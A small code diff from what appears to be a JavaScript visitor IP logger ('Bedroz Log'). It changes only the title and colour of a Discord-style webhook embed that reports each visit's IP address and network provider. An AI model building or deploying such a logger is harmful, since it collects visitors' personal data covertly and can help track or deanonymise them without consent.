@@ -27,7 +27,8 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username:   "Bedroz Log",
         avatar_url: "",
-        embeds:    [{ title: " New Visit",
+        embeds:    [{ title: ":clapper: New Visit",
+                    color: "#d773e3",
                     description: "__**:globe_with_meridians: IP-Adress:**__ \n" 
                     + "`" + ip + "`" + 
                     "\n \n__**:telephone: Provider:**__ \n" 
